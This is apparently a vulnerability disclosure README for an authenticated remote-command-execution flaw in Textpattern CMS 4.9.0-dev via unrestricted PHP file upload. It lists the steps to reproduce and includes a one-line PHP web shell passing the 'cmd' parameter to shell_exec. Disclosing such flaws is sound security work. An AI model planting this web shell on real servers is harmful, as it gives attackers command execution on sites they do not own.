# TextPattern-CMS-4.9.0-dev-Authenticated-Remote-Command-Execution-RCE-Through-File-Upload
Textpattern version 4.9.0 is vulnerable to Remote Code Execution (RCE) due to the file upload functionality allowing unrestricted PHP file uploads, potentially leading to remote code execution.

<B>Vulnerable URL:</B><br> 
http://localhost/textpattern/textpattern/index.php?event=file&step=file_insert<br> 

<B>Reproduction:</B><br> 
1. Log in as the root user in Textpattern.<br> 
2. Create a PHP web shell by making a file named rce.php with the content <?php echo shell_exec($_GET['cmd']); ?>.<br> 
3. Navigate to 'Content > Files' and upload the rce.php web shell.<br>
    ![alt text](https://github.com/patrickdeanramos/TextPattern-CMS-4.9.0-dev-Authenticated-Remote-Command-Execution-RCE-Through-File-Upload/blob/main/RCE-TextPatter-1.png?raw=True)
5. Access the web shell directly by going to https://<url>/textpattern/files/rce.php?cmd=id.<br> 
6. You can now interact with the web shell and execute commands using this 'cmd=id'.<br>
   ![alt text](https://github.com/patrickdeanramos/TextPattern-CMS-4.9.0-dev-Authenticated-Remote-Command-Execution-RCE-Through-File-Upload/blob/main/RCE-TextPatter-2.png?raw=True)

<B>Authors:</B><br> 
Patrick Dean Ramos<br> 
Nathu Nandwani<br> 
Junnair Manla<br> 
Kevin Rosales<br> 
Steve Nyan<br> 
Shanavas Shakeer<br> 
Lani Lambert<br> 

